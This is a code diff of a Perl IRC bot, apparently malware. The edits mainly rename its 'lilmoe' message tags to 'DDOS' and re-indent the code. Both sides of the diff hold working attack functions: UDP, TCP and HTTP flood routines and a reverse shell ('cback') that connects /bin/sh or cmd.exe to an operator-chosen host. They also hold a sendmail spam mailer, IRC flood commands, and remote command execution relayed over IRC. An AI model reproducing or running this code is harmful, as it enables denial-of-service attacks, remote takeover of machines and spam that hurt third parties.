-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 lilmoe ] 9,1Attack for 12".$1." 9,1finished in 12".$dtime." 9,1seconds9,1. ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 DDOS] 9,1Attack for 12".$1." 9,1finished in 12".$dtime." 9,1seconds9,1. ");
 }
 ##############
 if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 lilmoe ] 9,1Attacking 12".$1." 9,1with 12".$2." 9,1Kb Packets for 12".$3." 9,1seconds. ");
-    my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
-    $dtime = 1 if $dtime == 0;
-    my %bytes;
-    $bytes{igmp} = $2 * $pacotes{igmp};
-    $bytes{icmp} = $2 * $pacotes{icmp};
-    $bytes{o} = $2 * $pacotes{o};
-    $bytes{udp} = $2 * $pacotes{udp};
-    $bytes{tcp} = $2 * $pacotes{tcp};
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 lilmoe ] 9,1Results 12".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 DDOS] 9,1Attacking 12".$1." 9,1with 12".$2." 9,1Kb Packets for 12".$3." 9,1seconds. ");
+        my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
+        $dtime = 1 if $dtime == 0;
+        my %bytes;
+        $bytes{igmp} = $2 * $pacotes{igmp};
+        $bytes{icmp} = $2 * $pacotes{icmp};
+        $bytes{o} = $2 * $pacotes{o};
+        $bytes{udp} = $2 * $pacotes{udp};
+        $bytes{tcp} = $2 * $pacotes{tcp};
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 DDOS] 9,1Results 12".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
 }
 ##############
 if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
@@ -506,82 +582,82 @@ if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
     my $pacotese;
     my $fim = time + $dtime;
     my $pacota = 1;
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 lilmoe ] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
-    while (($pacota == "1") && ($pacotes == "1")) {
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 DDOS] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
+        while (($pacota == "1") && ($pacotes == "1")) {
             $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
             $pacote= $rand x $rand x $rand;
             $porta = int(rand 65000) +1 if ($porta == "0");
             send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
             }
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 lilmoe ] 9,1Results 12".$pacotese." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 DDOS] 9,1Results 12".$pacotese." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
 }
 ##############
  
 ##############
 if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [TCP lilmoe ] 9,1Attacking 12".$1.":".$2." 9,1for 12".$3." 9,1seconds. ");
-    my $itime = time;
-    my ($cur_time);
-    $cur_time = time - $itime;
-    while ($3>$cur_time){
-    $cur_time = time - $itime;
-    &tcpflooder("$1","$2","$3");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [TCP DDOS] 9,1Attacking 12".$1.":".$2." 9,1for 12".$3." 9,1seconds. ");
+        my $itime = time;
+        my ($cur_time);
+        $cur_time = time - $itime;
+        while ($3>$cur_time){
+        $cur_time = time - $itime;
+        &tcpflooder("$1","$2","$3");
 }
-    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [TCP lilmoe ] 9,1Attack ended on: 12".$1.":".$2."9,1. ");
+        sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [TCP DDOS] 9,1Attack ended on: 12".$1.":".$2."9,1. ");
 }
 ##############
 if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[HTTP lilmoe ] 9,1Attacking 12".$1." 9,1on port 80 for 12".$2." 9,1seconds. ");
-    my $itime = time;
-    my ($cur_time);
-    $cur_time = time - $itime;
-    while ($2>$cur_time){
-    $cur_time = time - $itime;
-    my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
-    print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
-    close($socket);
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[HTTP DDOS] 9,1Attacking 12".$1." 9,1on port 80 for 12".$2." 9,1seconds. ");
+        my $itime = time;
+        my ($cur_time);
+        $cur_time = time - $itime;
+        while ($2>$cur_time){
+        $cur_time = time - $itime;
+        my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
+        print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
+        close($socket);
 }
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [HTTP lilmoe ] 9,1Attacking ended on: 12".$1."9,1. ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [HTTP DDOS] 9,1Attacking ended on: 12".$1."9,1. ");
 }
 ##############
 if ($funcarg =~ /^cback\s+(.*)\s+(\d+)/) {
-    my $host = "$1";
-    my $port = "$2";
-    my $proto = getprotobyname('tcp');
-    my $iaddr = inet_aton($host);
-    my $paddr = sockaddr_in($port, $iaddr);
-    my $shell = "/bin/sh -i";
+        my $host = "$1";
+        my $port = "$2";
+        my $proto = getprotobyname('tcp');
+        my $iaddr = inet_aton($host);
+        my $paddr = sockaddr_in($port, $iaddr);
+        my $shell = "/bin/sh -i";
 if ($^O eq "MSWin32") {
-    $shell = "cmd.exe";
+        $shell = "cmd.exe";
 }
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [ConnectBack] 9,1Connecting to 12$host:$port ");
-    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
-    connect(SOCKET, $paddr) or die "connect: $!";
-    open(STDIN, ">&SOCKET");
-    open(STDOUT, ">&SOCKET");
-    open(STDERR, ">&SOCKET");
-    system("$shell");
-    close(STDIN);
-    close(STDOUT);
-    close(STDERR);
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [ConnectBack] 9,1Connecting to 12$host:$port ");
+        socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
+        connect(SOCKET, $paddr) or die "connect: $!";
+        open(STDIN, ">&SOCKET");
+        open(STDOUT, ">&SOCKET");
+        open(STDERR, ">&SOCKET");
+        system("$shell");
+        close(STDIN);
+        close(STDOUT);
+        close(STDERR);
 }
 ##############
 if ($funcarg =~ /^mail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Mailer] 9,1Sending email to: 12$3 ");
-    $subject = $1;
-    $sender = $2;
-    $recipient = $3;
-    @corpo = $4;
-    $mailtype = "content-type: text/html";
-    $sendmail = '/usr/sbin/sendmail';
-    open (SENDMAIL, "| $sendmail -t");
-    print SENDMAIL "$mailtype\n";
-    print SENDMAIL "Subject: $subject\n";
-    print SENDMAIL "From: $sender\n";
-    print SENDMAIL "To: $recipient\n\n";
-    print SENDMAIL "@corpo\n\n";
-    close (SENDMAIL);
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Mailer] 9,1Email Sended to: 12$recipient ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Mailer] 9,1Sending email to: 12$3 ");
+        $subject = $1;
+        $sender = $2;
+        $recipient = $3;
+        @corpo = $4;
+        $mailtype = "content-type: text/html";
+        $sendmail = '/usr/sbin/sendmail';
+        open (SENDMAIL, "| $sendmail -t");
+        print SENDMAIL "$mailtype\n";
+        print SENDMAIL "Subject: $subject\n";
+        print SENDMAIL "From: $sender\n";
+        print SENDMAIL "To: $recipient\n\n";
+        print SENDMAIL "@corpo\n\n";
+        close (SENDMAIL);
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Mailer] 9,1Email Sended to: 12$recipient ");
 }
 exit;
 }
@@ -589,25 +665,25 @@ exit;
 ##############
 if ($funcarg =~ /^ctcpflood (.*)/) {
     my $target = "$1";
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [IRCFlood] 9,1CTCP Flooding: 12".$target." ");
-    for (1..10) {
-    sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001VERSION\001\n");
-    sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001PING\001\n");
-    }
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [IRCFlood] 9,1CTCP Flooding: 12".$target." ");
+        for (1..10) {
+        sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001VERSION\001\n");
+        sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001PING\001\n");
+        }
 }
 ##############
 if ($funcarg =~ /^msgflood (.*)/) {
     my $target = "$1";
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [IRCFlood] 9,1MSG Flooding: 12".$target." ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [IRCFlood] 9,1MSG Flooding: 12".$target." ");
     sendraw($IRC_cur_socket, "PRIVMSG ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
 }
 ##############
 if ($funcarg =~ /^noticeflood (.*)/) {
     my $target = "$1";
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [IRCFlood] 9,1NOTICE Flooding: 12".$target." ");
-    for (1..2){
-    sendraw($IRC_cur_socket, "NOTICE ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
-    }
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [IRCFlood] 9,1NOTICE Flooding: 12".$target." ");
+        for (1..2){
+        sendraw($IRC_cur_socket, "NOTICE ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
+        }
 }
 ##############
  
@@ -700,13 +776,13 @@ sub shell {
 my $printl=$_[0];
 my $comando=$_[1];
 if ($comando =~ /cd (.*)/) {
-    chdir("$1") || msg("$printl", "No such file or directory");
-    return;
+        chdir("$1") || msg("$printl", "No such file or directory");
+        return;
 } elsif ($pid = fork) {
-    waitpid($pid, 0);
+        waitpid($pid, 0);
 } else {
 if (fork) {
-    exit;
+        exit;
 } else {
 my @resp=`$comando 2>&1 3>&1`;
 my $c=0;
@@ -730,30 +806,30 @@ my $msg = 'A' x $_[1];
 my $ftime = $_[2];
 my $cp = 0;
 my (%pacotes);
-    $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
-    socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
-    socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
-    socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
-    socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
-    return(undef) if $cp == 4;
+        $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
+        socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
+        socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
+        socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
+        socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
+        return(undef) if $cp == 4;
 my $itime = time;
 my ($cur_time);
-    while ( 1 ) {
+        while ( 1 ) {
 for (my $port = 1;
-    $port <= 65000; $port++) {
-    $cur_time = time - $itime;
+        $port <= 65000; $port++) {
+        $cur_time = time - $itime;
 last if $cur_time >= $ftime;
-    send(SOCK1, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{igmp}++;
-    send(SOCK2, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{udp}++;
-    send(SOCK3, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{icmp}++;
-    send(SOCK4, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{tcp}++;
+        send(SOCK1, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{igmp}++;
+        send(SOCK2, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{udp}++;
+        send(SOCK3, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{icmp}++;
+        send(SOCK4, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{tcp}++;
 for (my $pc = 3;
-    $pc <= 255;$pc++) {
+        $pc <= 255;$pc++) {
 next if $pc == 6;
-    $cur_time = time - $itime;
+        $cur_time = time - $itime;
 last if $cur_time >= $ftime;
-    socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
-    send(SOCK5, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{o}++;
+        socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
+        send(SOCK5, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{o}++;
 }
 }
 last if $cur_time >= $ftime;
@@ -765,27 +841,27 @@ sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
-    $ia=inet_aton($_[0]);
-    $pa=sockaddr_in($_[1],$ia);
-    $ftime=$_[2];
-    $proto=getprotobyname('tcp');
-    $j=0;$l=0;
-    $cur_time = time - $itime;
+        $ia=inet_aton($_[0]);
+        $pa=sockaddr_in($_[1],$ia);
+        $ftime=$_[2];
+        $proto=getprotobyname('tcp');
+        $j=0;$l=0;
+        $cur_time = time - $itime;
 while ($l<1000){
-    $cur_time = time - $itime;
+        $cur_time = time - $itime;
 last if $cur_time >= $ftime;
-    $t="SOCK$l";
-    socket($t,PF_INET,SOCK_STREAM,$proto);
-    connect($t,$pa)||$j--;
-    $j++;$l++;
+        $t="SOCK$l";
+        socket($t,PF_INET,SOCK_STREAM,$proto);
+        connect($t,$pa)||$j--;
+        $j++;$l++;
 }
-    $l=0;
+        $l=0;
 while ($l<1000){
-    $cur_time = time - $itime;
+        $cur_time = time - $itime;
 last if $cur_time >= $ftime;
-    $t="SOCK$l";
+        $t="SOCK$l";
 shutdown($t,2);
-    $l++;
+        $l++;
 }
 }
 ##############
